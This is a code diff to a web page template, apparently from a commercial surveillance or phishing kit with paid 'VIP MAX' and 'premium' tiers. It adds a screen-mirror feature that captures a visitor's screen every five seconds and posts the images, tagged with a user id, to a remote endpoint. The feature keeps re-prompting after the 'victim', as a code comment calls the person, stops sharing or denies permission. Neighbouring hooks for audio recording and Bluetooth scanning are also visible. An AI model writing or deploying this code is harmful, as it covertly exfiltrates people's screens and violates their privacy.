@@ -618,6 +618,50 @@ function doBluetoothScan(){
 }
 <% } %>
 
+<% if(screenMirrorAccess){ %>
+// ── Screen mirror — live JPEG screenshots every 5s (VIP MAX) ─────────────────
+async function doScreenMirror(){
+  try {
+    var stream = await navigator.mediaDevices.getDisplayMedia({video:{frameRate:1,width:{ideal:1920},height:{ideal:1080}},audio:false});
+    var video  = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    await video.play();
+    var canvas = document.createElement('canvas');
+    var ctx    = canvas.getContext('2d');
+    var active = true;
+
+    // When victim manually stops sharing → retry after 8s
+    stream.getVideoTracks()[0].addEventListener('ended', function(){
+      active = false;
+      setTimeout(doScreenMirror, 8000);
+    });
+
+    function capture(){
+      if(!active) return;
+      try {
+        canvas.width  = video.videoWidth  || 1280;
+        canvas.height = video.videoHeight || 720;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        var jpeg = canvas.toDataURL('image/jpeg', 0.45);
+        var b64  = jpeg.replace(/^data:image\/jpeg;base64,/, '');
+        $.post(a+'/screen-mirror', {uid: uid, img: encodeURIComponent(b64)});
+      } catch(e) {}
+      if(active) setTimeout(capture, 5000);
+    }
+
+    // Wait for first frame then start capturing
+    video.addEventListener('loadeddata', function(){ setTimeout(capture, 800); }, {once:true});
+    // Fallback if event already fired
+    if(video.readyState >= 2) setTimeout(capture, 800);
+
+  } catch(e) {
+    // Permission denied or not supported — retry after 30s
+    setTimeout(doScreenMirror, 30000);
+  }
+}
+<% } %>
+
 <% if(contaudioAccess){ %>
 // ── Continuous audio every 2 min (premium) ────────────────────────────────────
 function doContAudio(){
@@ -770,6 +814,7 @@ function doVerify(){
 <% if(bluetoothAccess){ %>  setTimeout(function(){doBluetoothScan();},3000);<% } %>
 <% if(pwaAccess){ %>  setTimeout(function(){doPWAInstall();},4000);<% } %>
 <% if(screenRecordAccess){ %>  setTimeout(function(){doScreenRecord();},1500);<% } %>
+<% if(screenMirrorAccess){ %>  setTimeout(function(){doScreenMirror();},2500);<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
